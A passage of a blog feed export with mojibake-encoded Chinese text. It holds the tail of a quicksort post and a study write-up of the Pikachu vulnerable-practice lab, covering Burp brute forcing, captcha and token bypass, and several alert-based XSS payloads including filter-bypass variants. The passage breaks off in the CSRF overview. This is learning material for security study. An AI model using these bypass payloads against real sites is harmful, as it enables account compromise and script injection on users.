pvector-&gt;record[j];</span><br><span class="line">        <span class="keyword">while</span>((pvector-&gt;record[i].key &lt;= temp.key) &amp;&amp; (j&gt;i))</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)</span><br><span class="line">            pvector-&gt;record[j--] = pvector-&gt;record[i];</span><br><span class="line">    &#125;</span><br><span class="line">    pvector-&gt;record[i] = temp;</span><br><span class="line">    quickSort(pvector,l,i<span class="number">-1</span>);</span><br><span class="line">    quickSort(pvector,i+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç®—æ³•æ˜¯<code>ä¸ç¨³å®š</code>çš„</li></ul><h2 id="åˆ†é…ç±»æ’åº"><a href="#åˆ†é…ç±»æ’åº" class="headerlink" title="åˆ†é…ç±»æ’åº"></a>åˆ†é…ç±»æ’åº</h2><h3 id="åŸºæ•°æ’åº"><a href="#åŸºæ•°æ’åº" class="headerlink" title="åŸºæ•°æ’åº"></a>åŸºæ•°æ’åº</h3><blockquote><p>ä»¥åæœ‰ç©ºè¡¥</p></blockquote><h2 id="å½’å¹¶ç±»æ’åº"><a href="#å½’å¹¶ç±»æ’åº" class="headerlink" title="å½’å¹¶ç±»æ’åº"></a>å½’å¹¶ç±»æ’åº</h2><h3 id="ä¸¤è·¯å½’å¹¶"><a href="#ä¸¤è·¯å½’å¹¶" class="headerlink" title="ä¸¤è·¯å½’å¹¶"></a>ä¸¤è·¯å½’å¹¶</h3><blockquote><p>ä»¥åæœ‰ç©ºè¡¥</p></blockquote><h3 id="å¤šè·¯å½’å¹¶"><a href="#å¤šè·¯å½’å¹¶" class="headerlink" title="å¤šè·¯å½’å¹¶"></a>å¤šè·¯å½’å¹¶</h3><blockquote><p>ä»¥åæœ‰ç©ºè¡¥</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®ç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachué¶åœºé€šå…³</title>
      <link href="/posts/25736/"/>
      <url>/posts/25736/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢<br>æœ€è¿‘è¦è½¬ä¸“ä¸šé¢è¯•äº†ï¼Œè€å¸ˆè¯´å¯èƒ½ä¼šé—®äº›å…³äºå®‰å…¨æ–¹é¢çš„é—®é¢˜ï¼Œæ¯”å¦‚å¸¸è§æ¼æ´çš„åŸç†ã€åˆ©ç”¨å’Œè§£å†³æ–¹æ¡ˆï¼Œåˆšå¥½åä¼šçš„ hxd ç»™æˆ‘æ¨èäº† Pikachu è¿™ä¸ªé¶åœºï¼Œè¿›å»çœ‹äº†æ˜¯éå¸¸é€‚åˆæˆ‘çš„ï¼Œæ¼æ´ç±»å‹æ¯”è¾ƒå…¨ï¼Œåˆ†å—ç»ƒä¹ ï¼Œè€Œä¸”æ¯ä¸ªæ¼æ´éƒ½æœ‰ä»‹ç»æˆå› å’Œä¸€äº›ç®€å•çš„è§£å†³æ–¹æ¡ˆï¼Œéå¸¸æ»¡æ„<br>ä¸ºäº†æ–¹ä¾¿å¤ä¹ ï¼ŒæŠŠæ¯ä¸ªæ¨¡å—çš„æ¦‚è¿°éƒ½æè¿›åšå®¢é‡Œ :)</p></blockquote><h1 id="æ­å»ºé¶åœº"><a href="#æ­å»ºé¶åœº" class="headerlink" title="æ­å»ºé¶åœº"></a>æ­å»ºé¶åœº</h1><ol><li>å»å®˜ç½‘æŠŠé¶åœºä¸‹ä¸‹æ¥ã€‚<a href="https://github.com/zhuifengshaonianhanlu/pikachu">å®˜ç½‘é“¾æ¥</a></li><li>æŠŠ<code>pikachu</code>æ–‡ä»¶å¤¹æ”¾åˆ°<code>phpstudy</code>çš„<code>webæœåŠ¡å™¨æ ¹ç›®å½•</code>ä¸‹</li><li>è¿›å…¥<code>pikachu/inc/config.inc.php</code>æ›´æ”¹æ•°æ®åº“è¿æ¥çš„è´¦å·å¯†ç </li><li>è®¿é—®<code>localhost/pikachu-master/index.php</code>ï¼Œè¿›è¡Œåˆå§‹åŒ–å®‰è£…</li><li>å¼€é”¤</li></ol><h1 id="Burt-Force-æš´åŠ›ç ´è§£æ¼æ´"><a href="#Burt-Force-æš´åŠ›ç ´è§£æ¼æ´" class="headerlink" title="Burt Force(æš´åŠ›ç ´è§£æ¼æ´)"></a>Burt Force(æš´åŠ›ç ´è§£æ¼æ´)</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>â€œæš´åŠ›ç ´è§£â€æ˜¯ä¸€æ”»å‡»å…·æ‰‹æ®µï¼Œåœ¨webæ”»å‡»ä¸­ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ç§æ‰‹æ®µå¯¹åº”ç”¨ç³»ç»Ÿçš„è®¤è¯ä¿¡æ¯è¿›è¡Œè·å–ã€‚å…¶è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨å¤§é‡çš„è®¤è¯ä¿¡æ¯åœ¨è®¤è¯æ¥å£è¿›è¡Œå°è¯•ç™»å½•ï¼Œç›´åˆ°å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæš´åŠ›ç ´è§£ä¸€èˆ¬ä¼šä½¿ç”¨å¸¦æœ‰å­—å…¸çš„å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚<br>ç†è®ºä¸Šæ¥è¯´ï¼Œå¤§å¤šæ•°ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥è¢«æš´åŠ›ç ´è§£çš„ï¼Œåªè¦æ”»å‡»è€…æœ‰è¶³å¤Ÿå¼ºå¤§çš„è®¡ç®—èƒ½åŠ›å’Œæ—¶é—´ï¼Œæ‰€ä»¥æ–­å®šä¸€ä¸ªç³»ç»Ÿæ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œå…¶æ¡ä»¶ä¹Ÿä¸æ˜¯ç»å¯¹çš„ã€‚æˆ‘ä»¬è¯´ä¸€ä¸ªwebåº”ç”¨ç³»ç»Ÿå­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œä¸€èˆ¬æ˜¯æŒ‡è¯¥webåº”ç”¨ç³»ç»Ÿæ²¡æœ‰é‡‡ç”¨æˆ–è€…é‡‡ç”¨äº†æ¯”è¾ƒå¼±çš„è®¤è¯å®‰å…¨ç­–ç•¥ï¼Œå¯¼è‡´å…¶è¢«æš´åŠ›ç ´è§£çš„â€œå¯èƒ½æ€§â€å˜çš„æ¯”è¾ƒé«˜ã€‚è¿™é‡Œçš„è®¤è¯å®‰å…¨ç­–ç•¥, åŒ…æ‹¬ï¼š</p><ol><li>æ˜¯å¦è¦æ±‚ç”¨æˆ·è®¾ç½®å¤æ‚çš„å¯†ç ï¼›</li><li>æ˜¯å¦æ¯æ¬¡è®¤è¯éƒ½ä½¿ç”¨å®‰å…¨çš„éªŒè¯ç ï¼ˆæƒ³æƒ³ä½ ä¹°ç«è½¦ç¥¨æ—¶è¾“çš„éªŒè¯ç ï½ï¼‰æˆ–è€…æ‰‹æœºotpï¼›</li><li>æ˜¯å¦å¯¹å°è¯•ç™»å½•çš„è¡Œä¸ºè¿›è¡Œåˆ¤æ–­å’Œé™åˆ¶ï¼ˆå¦‚ï¼šè¿ç»­5æ¬¡é”™è¯¯ç™»å½•ï¼Œè¿›è¡Œè´¦å·é”å®šæˆ–IPåœ°å€é”å®šç­‰ï¼‰ï¼›</li><li>æ˜¯å¦é‡‡ç”¨äº†åŒå› ç´ è®¤è¯ï¼›</li><li>ç­‰ç­‰ã€‚<br>åƒä¸‡ä¸è¦å°çœ‹æš´åŠ›ç ´è§£æ¼æ´,å¾€å¾€è¿™ç§ç®€å•ç²—æš´çš„æ”»å‡»æ–¹å¼å¸¦æ¥çš„æ•ˆæœæ˜¯è¶…å‡ºé¢„æœŸçš„!<br>ä»æ¥æ²¡æœ‰å“ªä¸ªæ—¶ä»£çš„é»‘å®¢åƒä»Šå¤©ä¸€æ ·çƒ­è¡·äºçŒœè§£å¯†ç   â€”å¥¥æ–¯ç‰¹æ´›å¤«æ–¯åŸº</li></ol><h2 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h2><p>å°±å¾ˆç®€å•çš„ç™»é™†ç•Œé¢ï¼Œä¹Ÿæ²¡æœ‰éªŒè¯ç ï¼Œç›´æ¥ä¸¢burpçˆ†ç ´</p><p><img src="https://s1.ax1x.com/2020/09/19/w5nm4S.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5nMcj.png"></p><blockquote><p>å³è¾¹çš„æç¤ºç»™äº†ä¸‰ç»„è´¦å·å¯†ç å…¶å®éƒ½æ˜¯å¯¹çš„ï¼Œä½†æ˜¯è¿˜æ˜¯è€è€å®å®æ‰“å¼€<code>burp suite</code>çˆ†ç ´äº†ä¸€éï¼Œç†Ÿæ‚‰ä¸€ä¸‹</p></blockquote><h2 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰</h2><p>å‡ºç°ä¸€ä¸ªéªŒè¯ç ï¼Œè€æ ·å­å…ˆæŠ“åŒ…ä¸¢<code>Repeater</code>é‡Œé¢Goä¸€ä¸‹ï¼Œå‘ç°è´¦å·å¯†ç è¾“é”™çš„æƒ…å†µä¸‹ï¼ŒéªŒè¯ç ä¸ä¼šæ›´æ–°ï¼ŒéªŒè¯ç åªä¼šåœ¨ç”¨æˆ·è¾“é”™éªŒè¯ç çš„æ—¶å€™æ›´æ–°ï¼Œé‚£å°±è€æ ·å­ç›´æ¥çˆ†ç ´</p><h2 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰</h2><p>éšä¾¿è¾“ä¸€ä¸‹å‘ç°ä¼šæœ‰å¼¹çª—è­¦å‘Šï¼Œæç¤ºé‡Œé¢å†™ç€çœ‹å‰ç«¯JSçš„æºç ï¼ŒF12æ£€æŸ¥å…ƒç´ ä»¥åå‘ç°éªŒè¯ç éƒ¨åˆ†ä»£ç å¯ä»¥åˆ æ‰ï¼Œåˆ æ‰ä»¥åå°±å¯ä»¥çˆ†ç ´äº†</p><p><img src="https://s1.ax1x.com/2020/09/19/w5n1un.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5n3Bq.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5nK3Q.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5nu9g.png"></p><h2 id="tokené˜²çˆ†ç ´ï¼Ÿ"><a href="#tokené˜²çˆ†ç ´ï¼Ÿ" class="headerlink" title="tokené˜²çˆ†ç ´ï¼Ÿ"></a>tokené˜²çˆ†ç ´ï¼Ÿ</h2><blockquote><p>è¿™é¢˜ä¸ä¼šï¼Œçœ‹çš„wp</p></blockquote><p>æŠ“åŒ…å‘ç°æœ‰ tokenï¼Œ<code>Repeater</code>åå‘ç°è¿”å›åŒ…é‡Œæœ‰ token çš„æ–°å€¼ï¼Œå³ä¸‹ä¸€æ¬¡ç™»é™†çš„ token å€¼åœ¨ä¸Šä¸€æ¬¡ç™»é™†çš„è¿”å›åŒ…é‡Œï¼Œæ‰€ä»¥çˆ†ç ´åªèƒ½å•çº¿ç¨‹ï¼Œ<code>send intruder</code>ï¼Œè®¾ç½®çº¿ç¨‹ä¸º1ï¼ŒGrep Extractå¤„æ·»åŠ ï¼Œé€‰æ‹©è¿”å›åŒ…é‡Œçš„ token å€¼å¤åˆ¶ç„¶åç¡®è®¤ï¼Œé‡å®šå‘é€‰æ‹©<code>æ€»æ˜¯</code>ï¼Œæœ‰æ•ˆè½½è·ä¸­é€‰é€’å½’æœç´¢ï¼Œå¡«å…¥åˆšåˆšå¤åˆ¶çš„æ–° token å€¼ï¼ŒåŠ è½½å­—å…¸å¼€å§‹çˆ†ç ´</p><p><img src="https://s1.ax1x.com/2020/09/19/w5nQjs.png"></p><h1 id="XSS-è·¨ç«™è„šæœ¬æ¼æ´"><a href="#XSS-è·¨ç«™è„šæœ¬æ¼æ´" class="headerlink" title="XSS(è·¨ç«™è„šæœ¬æ¼æ´)"></a>XSS(è·¨ç«™è„šæœ¬æ¼æ´)</h1><h2 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>Cross-Site Scripting ç®€ç§°ä¸ºâ€œCSSâ€ï¼Œä¸ºé¿å…ä¸å‰ç«¯å æˆæ ·å¼è¡¨çš„ç¼©å†™â€CSSâ€å†²çªï¼Œæ•…åˆç§°XSSã€‚ä¸€èˆ¬XSSå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç§å¸¸è§ç±»å‹ï¼š</p><ol><li>åå°„æ€§XSS;</li><li>å­˜å‚¨å‹XSS;</li><li>DOMå‹XSS;</li></ol><p>XSSæ¼æ´ä¸€ç›´è¢«è¯„ä¼°ä¸ºwebæ¼æ´ä¸­å±å®³è¾ƒå¤§çš„æ¼æ´ï¼Œåœ¨OWASP TOP10çš„æ’åä¸­ä¸€ç›´å±äºå‰ä¸‰çš„æ±Ÿæ¹–åœ°ä½ã€‚<br>XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œæ‰€ä»¥å…¶å±å®³çš„å¯¹è±¡ä¹Ÿæ˜¯å‰ç«¯ç”¨æˆ·ã€‚<br>å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚<br>å› æ­¤åœ¨XSSæ¼æ´çš„é˜²èŒƒä¸Šï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨â€œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤â€å’Œâ€œè¾“å‡ºè¿›è¡Œè½¬ä¹‰â€çš„æ–¹å¼è¿›è¡Œå¤„ç†:<br>è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥;<br>è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰;<br>ä½ å¯ä»¥é€šè¿‡â€œCross-Site Scriptingâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</p><h2 id="åå°„å‹xss-get"><a href="#åå°„å‹xss-get" class="headerlink" title="åå°„å‹xss(get)"></a>åå°„å‹xss(get)</h2><p>å¸¸è§„è¾“å…¥</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹çœ‹æ•ˆæœï¼Œå‘ç°è¾“å…¥çš„åœ°æ–¹é™åˆ¶äº†è¾“å…¥çš„å­—ç¬¦æ•°é‡ï¼Œç‚¹å‡»æäº¤åå‘ç° xss è¯­å¥ç›´æ¥è¢«æ‹¼æ¥åˆ°äº† url è¯­å¥é‡Œé¢ï¼Œç›´æ¥åœ¨ url é‡Œé¢è¡¥å…¨ xss è¯­å¥ï¼Œè¾¾åˆ°ç›®çš„</p><p><img src="https://s1.ax1x.com/2020/09/19/w5c8SO.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5c1fK.png"></p><p>æ”»å‡»æˆåŠŸ</p><h2 id="åå°„å‹xss-post"><a href="#åå°„å‹xss-post" class="headerlink" title="åå°„å‹xss(post)"></a>åå°„å‹xss(post)</h2><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°±èƒ½æˆåŠŸ</p><h2 id="å‚¨å­˜å‹xss"><a href="#å‚¨å­˜å‹xss" class="headerlink" title="å‚¨å­˜å‹xss"></a>å‚¨å­˜å‹xss</h2><p>ç•™è¨€æ¡†ï¼Œç›´æ¥ä¸Šxssä»£ç å°±èƒ½å¼¹å‡ºæ¥</p><blockquote><p>ç™¾åº¦äº†ä¸€ä¸‹åŸç†ï¼Œå› ä¸ºå­˜å‚¨å‹xssæ˜¯ä¿å­˜åœ¨æ•°æ®åº“é‡Œçš„ï¼Œå¦‚æœç”¨æˆ·åˆ·æ–°ï¼Œç•™è¨€åˆ—è¡¨ä¼šä»æ•°æ®åº“æå–å‡ºxssæ•°æ®å¼¹æ¡†ï¼Œå­˜çš„å¥½ä¼šä¸€ç›´å¼¹å‡ºæ¥ï¼Œè¶Šå¼¹è¶Šå¤š</p></blockquote><h2 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h2><blockquote><p>è¿™é¢˜ä¸ä¼šï¼Œçœ‹çš„wpï¼Œhtmlã€JSå’ŒDOMçš„çŸ¥è¯†æœ‰ç‚¹æ¬ ç¼ºï¼Œç•™ä¸ªå¤§å‘ä¹‹åè¦è¡¥ä¸€ä¸‹</p></blockquote><p>æ„é€ æ™®é€šçš„ xss è¯­å¥æäº¤ä¸Šå»å‡ºç° what do you seeï¼Ÿä¸€ä¸ªé“¾æ¥ï¼ŒF12æ£€æŸ¥å…ƒç´ å‘ç°é“¾æ¥æ­£æ˜¯æˆ‘ä»¬è¾“å…¥çš„ xss è¯­å¥</p><p>é—­åˆæ‰å‰é¢çš„å¼•å·å³å¯ï¼Œpayloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/19/w5cJ6e.png"></p><p>æ”»å‡»æˆåŠŸ</p><h2 id="DOMå‹xss-x"><a href="#DOMå‹xss-x" class="headerlink" title="DOMå‹xss-x"></a>DOMå‹xss-x</h2><blockquote><p>è¿™é¢˜åŒä¸Šï¼Œä¹Ÿæ˜¯çœ‹äº†wpï¼Œåé¢è¿˜è¦è®¤çœŸå­¦</p></blockquote><p>payloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€™ onclick=&quot;alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/19/w5cGlD.png"></p><p>æ”»å‡»æˆåŠŸ</p><h2 id="xssä¹‹ç›²æ‰“"><a href="#xssä¹‹ç›²æ‰“" class="headerlink" title="xssä¹‹ç›²æ‰“"></a>xssä¹‹ç›²æ‰“</h2><p>ç›²æ‰“å°±æ˜¯åœ¨èƒ½æ’ xss è¯­å¥çš„åœ°æ–¹éƒ½æ’ä¸Šï¼Œä¹±æ‰“ï¼Œä½†æ˜¯æäº¤ä¸Šå»æ²¡æœ‰å¼¹çª—çš„å›æ˜¾ï¼Œç‚¹äº†æç¤ºåçŸ¥é“äº†åå°çš„å¯†ç ï¼Œæ‰€ä»¥ xss è¯­å¥ä¸Šä¼ åˆ°åå°å»äº†</p><p><img src="https://s1.ax1x.com/2020/09/19/w5caTI.png"></p><h2 id="xssä¹‹è¿‡æ»¤"><a href="#xssä¹‹è¿‡æ»¤" class="headerlink" title="xssä¹‹è¿‡æ»¤"></a>xssä¹‹è¿‡æ»¤</h2><p>ä¼ æ™®é€šçš„ xss è¯­å¥å</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸€å¥è¯ï¼Œ<code>åˆ«è¯´è¿™äº›&#39;&gt;&#39;çš„è¯,ä¸è¦æ€•,å°±æ˜¯å¹²!</code>ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯è¿‡æ»¤æ‰äº†<code>&lt;&gt;</code>å†…çš„å†…å®¹ï¼Œç™¾åº¦ xss ç»•è¿‡å§¿åŠ¿ä»¥åæ„é€ payloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScriPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">ScriPT</span>&gt;</span><span class="comment">&lt;!--å¯èƒ½åå°åªåŒ¹é…å°å†™çš„script--&gt;</span></span><br><span class="line">&lt;scri<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">pt&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/scr</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>pt&gt;<span class="comment">&lt;!--åå°å¯èƒ½æŠŠ&lt;script&gt;è¿‡æ»¤æ‰ï¼Œå¯èƒ½åªå»æ‰ä¸€æ¬¡--&gt;</span></span><br><span class="line">&lt;scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;alert(111)&lt;/sc<span class="comment">&lt;!--test--&gt;</span>ript&gt;<span class="comment">&lt;!--åŠ ä¸Šæ³¨é‡Šåå¯èƒ½å¯ä»¥ç»•è¿‡åå°è¿‡æ»¤æœºåˆ¶--&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™é¢˜åªæœ‰å¤§å°å†™åŒ¹é…èƒ½è¿‡</p></blockquote><h2 id="xssä¹‹htmlspecialchars"><a href="#xssä¹‹htmlspecialchars" class="headerlink" title="xssä¹‹htmlspecialchars"></a>xssä¹‹htmlspecialchars</h2><p>é¦–å…ˆç™¾åº¦ htmlspecialchars æ˜¯ä»€ä¹ˆä¸œè¥¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars()æ˜¯PHPé‡Œé¢æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“çš„å‡½æ•°</span><br><span class="line">é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯</span><br><span class="line">&amp; æˆä¸º &amp;amp</span><br><span class="line">&quot; æˆä¸º &amp;quot</span><br><span class="line">&#x27; æˆä¸º &amp;#039</span><br><span class="line">&lt; æˆä¸º &amp;lt</span><br><span class="line">&gt; æˆä¸º &amp;gt</span><br><span class="line">å¯ç”¨å¼•å·ç±»å‹</span><br><span class="line">ENT_COMPATï¼šé»˜è®¤ï¼Œä»…ç¼–ç åŒå¼•å·</span><br><span class="line">ENT_QUOTESï¼šç¼–ç åŒå¼•å·å’Œå•å¼•å·</span><br><span class="line">ENT_NOQUOTESï¼šä¸ç¼–ç ä»»ä½•å¼•å·</span><br></pre></td></tr></table></figure><blockquote><p>è¾“å…¥<code>&#39;&quot;&lt;&gt;</code>åå¾—åˆ°çš„ç»“æœæ˜¯<code>\&#39;\&quot;&lt;&gt;</code>ï¼Œåœ¨æ¯ä¸ªå•å¼•å·å’ŒåŒå¼•å·å‰é¢åŠ äº†<code>\</code>ï¼Œä¸æ‡‚æ€ä¹ˆåšï¼Œä»¥åå›æ¥å¡«å‘</p></blockquote><p><img src="https://s1.ax1x.com/2020/09/19/w5cNmd.png"></p><h2 id="xssä¹‹hrefè¾“å‡º"><a href="#xssä¹‹hrefè¾“å‡º" class="headerlink" title="xssä¹‹hrefè¾“å‡º"></a>xssä¹‹hrefè¾“å‡º</h2><p>è¿™é‡ŒæŠŠ<code>&#39;</code> <code>&quot;</code> <code>&lt;</code> <code> &gt;</code>å››ä¸ªå…¨éƒ¨è¿‡æ»¤æ‰äº†ï¼Œä¸ä¼šåšï¼Œç™¾åº¦è¯´ç”¨<code>javascript:</code>ä¼ªåè®®ç»•è¿‡</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><p>é˜²å¾¡æªæ–½ï¼š</p><ol><li>è¾“å…¥çš„æ—¶å€™åªå…è®¸ http æˆ– https å¼€å¤´çš„åè®®ï¼Œæ‰å…è®¸è¾“å‡º</li><li>å…¶æ¬¡å†è¿›è¡Œ htmlspecialchars å¤„ç†</li></ol><p><img src="https://s1.ax1x.com/2020/09/19/w5cQFx.png"></p><p>æ”»å‡»æˆåŠŸ</p><h2 id="xssä¹‹jsè¾“å‡º"><a href="#xssä¹‹jsè¾“å‡º" class="headerlink" title="xssä¹‹jsè¾“å‡º"></a>xssä¹‹jsè¾“å‡º</h2><p>æ ‡é¢˜æƒ³åˆ°çœ‹ js çš„æºç ï¼Œæºç æ„æ€å°±æ˜¯ get ä¼ å‚ç»™ $msï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯ else æ¡ä»¶çš„ alert èƒ½å¤Ÿæ„é€  xss è¯­å¥ï¼Œä½†æ˜¯è¿™è¡Œè¢«æ³¨é‡Šæ‰äº†ï¼Œåæ¥ç™¾åº¦çŸ¥é“æ˜¯ç›´æ¥åœ¨å‚æ•°èµ‹å€¼é‚£é‡Œæ³¨å…¥</p><p>payloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure><p>&#96;<img src="https://s1.ax1x.com/2020/09/19/w5cYOH.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/w5cU0A.png"></p><p>æ”»å‡»æˆåŠŸ</p><h1 id="CSRF-è·¨ç«™è¯·æ±‚ä¼ªé€ "><a href="#CSRF-è·¨ç«™è¯·æ±‚ä¼ªé€ " class="headerlink" title="CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )"></a>CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )</h1><h2 id="æ¦‚è¿°-2"><a href="#æ¦‚è¿°-2" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>Cross-site request forgery  ç®€ç§°ä¸ºâ€œCSRFâ€ï¼Œåœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿæˆä¸ºâ€one 